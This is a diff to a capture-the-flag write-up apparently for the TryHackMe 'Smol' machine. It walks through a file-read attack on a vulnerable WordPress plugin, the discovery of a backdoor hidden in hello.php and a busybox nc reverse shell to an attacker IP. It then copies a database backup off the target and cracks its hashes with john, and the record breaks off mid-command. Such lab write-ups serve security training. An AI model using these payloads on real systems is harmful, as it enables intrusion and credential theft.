@@ -159,6 +159,68 @@ Here is the reference [link](https://wpscan.com/vulnerability/ad01dad9-12ff-404f
 and it works, that is crazy.
 <img width="1599" height="878" alt="Screenshot_2025-09-28_23-02-18" src="https://github.com/user-attachments/assets/aebb6d62-6643-4375-ad8f-a12d1d75b2f9" />
 
-So I got database credential
+So I got database credential, try to login to the login portal. Successfully
+<img width="1920" height="1002" alt="Screenshot_2025-09-30_20-48-10" src="https://github.com/user-attachments/assets/89cde7d8-c3cd-43ca-939a-cc1409c9750c" />
 
+Inside the `pages` section, `Webmaster Tasks`, I came across this
+<img width="983" height="50" alt="Screenshot_2025-09-30_21-17-17" src="https://github.com/user-attachments/assets/1d6b10ce-0d9e-4100-a161-8fd6abbdd6d8" />
+this tells me about the file called `hello.php` in side the `/plugins` folder.
 
+Based on the previous payload, I am at `wp-content/plugins/jsmol2wp/php/`, so I have to move back two directory to read hello.php
+```
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+```
+<img width="1124" height="268" alt="Screenshot_2025-09-30_21-23-24" src="https://github.com/user-attachments/assets/542deb00-3ac3-4d9f-b749-c0799f52f7d9" />
+I noticed this function is kinda suspicious because it contains a encoded string. I use cyberchef to decode it
+
+<img width="1536" height="591" alt="Screenshot_2025-09-30_21-23-33" src="https://github.com/user-attachments/assets/63777634-ad54-43d8-aa16-73d5b18cad5f" />
+then got something is kinda random "\143\155\x64" and "\143\x6d\144"
+Using this [tool](https://malwaredecoder.quttera.com/) to decode 
+<img width="308" height="497" alt="Screenshot_2025-09-30_21-31-54" src="https://github.com/user-attachments/assets/44af8efb-106d-48c8-881d-d1bcbe17f882" />
+
+which means that, everything I would type on that will be converted into command for system. How do I know that where the hello dolly function actually is?
+
+<img width="1756" height="413" alt="Screenshot_2025-09-30_21-35-38" src="https://github.com/user-attachments/assets/9f3f7b84-ea4c-46f6-8fc0-4f301c6d828f" />
+Pay a little attention to the top right of the task bar, I saw the lyric, belong to `hello.php`
+
+First, I need to set the listenter on my host machine
+```
+nc -lnvp 1111
+```
+Then this is the payload
+```
+busybox nc 10.23.99.113 1111 -e bash
+```
+Here is the full triggering phase
+```
+http://www.smol.thm/wp-admin/index.php?cmd=busybox nc 10.23.99.113 1111 -e bash
+```
+Then I successfully got a shell
+
+## Interactive shell
+I have one python script which can make this reverse shell into interactive shell. But I need to check whether this server has python or not
+<img width="246" height="55" alt="Screenshot_2025-09-30_21-53-03" src="https://github.com/user-attachments/assets/1030a991-cd24-4d61-9b57-db1602dfef2a" />
+
+Yes it does
+```
+python3 -c "impot pty;pty.spawn('/bin/bash')"
+```
+And the terminal should look like this
+<img width="484" height="33" alt="Screenshot_2025-09-30_21-56-24" src="https://github.com/user-attachments/assets/eecd4691-ffd2-492e-aa48-1304158089b4" />
+
+Let's keep digging for further information. There is one folder which I need to check first is `/opt/` which contains a file `wp_backup.sql`, and `/tmp` is clear so have a look at th `wp_backup.sql`
+Well, I need for move the file to my host for convenience.
+
+On the target
+```
+python3 -m http.server 9000
+```
+On my host
+```
+wget http://<MACHINE_IP>:9000/wp.backup.sql
+```
+<img width="978" height="117" alt="Screenshot_2025-09-30_22-06-36" src="https://github.com/user-attachments/assets/424bab28-4936-46a6-b8be-ca5a12b5da8b" />
+I reckon that the third value in each list is the password for each user. So I need to crack them since they are in hashed format
+
+```
+john --wordlist=<WORDLIST PATH> <HASHED FILE>
